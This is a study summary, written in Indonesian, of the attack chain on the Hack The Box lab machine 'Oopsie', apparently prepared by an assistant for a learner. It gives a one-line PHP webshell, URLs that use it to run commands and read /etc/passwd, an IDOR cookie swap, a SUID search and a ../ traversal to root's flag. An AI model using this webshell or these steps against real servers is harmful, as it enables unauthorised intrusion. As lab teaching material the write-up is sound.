# Resume Materi — HTB Machine: Oopsie 🐂
## [30 Apr 2026]

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ATTACK CHAIN OOPSIE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Nmap → Web Enum → Cookie Manipulation → IDOR
→ File Upload → RCE → SSH → SUID Exploit → ROOT

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 RECONNAISSANCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tool   : nmap
Tujuan : Temukan port terbuka & service yang berjalan

Perintah dasar :
  nmap -sV -sC <IP>
    -sV = deteksi versi service
    -sC = jalankan default scripts
    -T4 = kecepatan scan (1=lambat, 5=cepat)
    -p- = scan semua port (1-65535)
    -A  = aggressive scan (OS, version, script, traceroute)

Port penting yang wajib hapal :
  22  = SSH
  80  = HTTP
  443 = HTTPS
  21  = FTP
  3306= MySQL

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 WEB ENUMERATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tool   : Gobuster
Tujuan : Temukan direktori & file tersembunyi di web server

Perintah :
  gobuster dir -u http://<IP> -w <wordlist> -x php
    dir  = mode directory enumeration
    -u   = target URL
    -w   = wordlist (daftar nama direktori yang dicoba)
    -x   = ekstensi file yang dicari (php, html, txt)
    -t   = jumlah threads (default 10, lebih tinggi = lebih cepat)

Wordlist default Kali :
  /usr/share/wordlists/dirb/common.txt      → umum
  /usr/share/wordlists/dirbuster/...        → lebih lengkap

Status code penting :
  200 = ada & bisa diakses
  301 = redirect (folder)
  403 = ada tapi dilarang akses
  404 = tidak ada

Web root Apache Ubuntu : /var/www/html/
Web root Nginx         : /usr/share/nginx/html/
Web root IIS (Windows) : C:\inetpub\wwwroot\

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TOOLS WEB ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Burp Suite  = intercept & manipulasi HTTP request/response
  Proxy tab     → tangkap & edit request sebelum dikirim ke server
  Repeater tab  → simulasi/test request (tidak ubah browser)
  Target tab    → peta semua URL yang sudah dikunjungi browser
  Intercept on  → aktifkan untuk tangkap request dari browser

Firefox DevTools (F12) :
  Storage tab   → lihat & edit cookies langsung
  Network tab   → lihat request & response headers
  Inspector     → lihat source code HTML
  Ctrl+U        → lihat full source code halaman

Wappalyzer   = ekstensi browser, auto-detect tech stack

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 COOKIE & SESSION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Cookie  = data kecil yang disimpan browser, dikirim setiap request
          Dipakai server untuk "ingat" siapa kamu antar halaman

Contoh cookie berbahaya :
  role=guest → role=admin   ← server percaya begitu saja!
  user=2233  → user=34322   ← ganti ID user

Cara edit cookie :
  1. F12 → Storage → Cookies → edit langsung
  2. Burp Suite Proxy → intercept → edit di request

Perbedaan Repeater vs Proxy Intercept :
  Repeater  = simulasi request, TIDAK ubah cookie di browser
  Intercept = modifikasi request ASLI dari browser → efek nyata

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 VULNERABILITY: IDOR
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IDOR = Insecure Direct Object Reference
Celah : server tidak validasi apakah user BOLEH akses resource itu

Contoh :
  /admin.php?id=2  → data guest
  /admin.php?id=1  → data admin (ID terkecil = dibuat pertama)

Teknik   : decrease/increase nilai parameter di URL
Pelajaran: selalu coba ubah angka ID di URL parameter!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 FILE UPLOAD + WEBSHELL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Webshell = file PHP berbahaya yang diupload ke server
           Memberi akses RCE (Remote Code Execution) via browser

Buat webshell :
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

Cara pakai :
  http://<IP>/uploads/shell.php?cmd=whoami
  http://<IP>/uploads/shell.php?cmd=ls+/var/www/html
  http://<IP>/uploads/shell.php?cmd=cat+/etc/passwd

Catatan penting :
  - Spasi di URL diganti + atau %20
  - Karakter spesial (>, &, ;) perlu URL encoding
  - Webshell stateless → tiap cmd= itu request baru, tidak bisa cd
  - Gunakan : cmd=ls+/folder/tujuan (bukan cd dulu)

Cara baca file PHP via webshell :
  cat     → gagal (PHP dieksekusi, bukan ditampilkan)
  strings → baca string dari binary/file
  od -c   → dump file sebagai karakter (paling reliable)
  wc -c   → hitung ukuran file (cek apakah kosong)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 LINUX COMMAND PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ls -la <path>     = lihat isi folder + permission detail
cat <file>        = tampilkan isi file
find / -group <X> = cari file milik group tertentu
find / -perm -4000= cari semua file SUID
od -c <file>      = baca file sebagai raw karakter
strings <file>    = ekstrak string dari file binary
wc -c <file>      = hitung ukuran file (bytes)
whoami            = tau kita login sebagai siapa
id                = info user + group kita

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PRIVILEGE ESCALATION: SUID
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SUID = Set owner User ID
       File dengan SUID selalu jalan dengan privilege PEMILIKNYA
       bukan privilege yang menjalankannya

Ciri di permission : huruf s menggantikan x
  -rwsr-xr--  ← s di posisi owner execute = SUID aktif!

Cara cari file SUID :
  find / -perm -4000 2>/dev/null
  find / -group bugtracker 2>/dev/null

Eksploitasi : kalau SUID binary dimiliki root → jalankan = jalan sebagai root!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PATH TRAVERSAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Teknik  : masukkan ../ berulang untuk naik folder
          lalu masuk ke folder target

Contoh :
  Program baca : /root/reports/[INPUT]
  Input kita   : ../../../root/root.txt
  Hasil        : cat /root/reports/../../../root/root.txt
               = cat /root/root.txt ✓

Cara tau harus mundur berapa kali :
  1. Lihat error message → ketauan path aslinya
  2. Hitung kedalaman folder dari path error
  3. Tiap ../ = naik 1 level
  4. Kalau ragu → coba mulai dari banyak ../ lalu kurangi

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SSH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Perintah : ssh <user>@<IP>
Switch   :
  -p  = port berbeda dari default 22
  -i  = pakai private key file
  -v  = verbose/debug mode

Flag ada di  :
  User flag : /home/<user>/user.txt
  Root flag : /root/root.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PERMISSION LINUX — CARA BACA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Format : [tipe][owner][group][others]
Contoh : -rwsr-xr--

  Tipe   : - = file biasa, d = direktori, l = symlink
  r = read    (4)
  w = write   (2)
  x = execute (1)
  s = SUID/SGID (execute + set ID)
  - = tidak ada permission

Urutan : owner (3) → group (3) → others (3)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RCE      = Remote Code Execution → eksekusi perintah di server dari jarak jauh
SUID     = Set owner User ID → file jalan sebagai pemiliknya
IDOR     = Insecure Direct Object Reference → akses resource tanpa validasi
Webshell = file berbahaya untuk RCE via browser
Cookie   = data sesi browser yang bisa dimanipulasi
Path Traversal = navigasi folder via ../ untuk akses file di luar batas
Foothold = akses awal ke sistem (contoh: dapat shell www-data)
Privesc  = Privilege Escalation → naik dari user biasa ke root
```

Semua yang perlu dihapal dari Oopsie ada di sini! Mau lanjut ke machine berikutnya? 🚀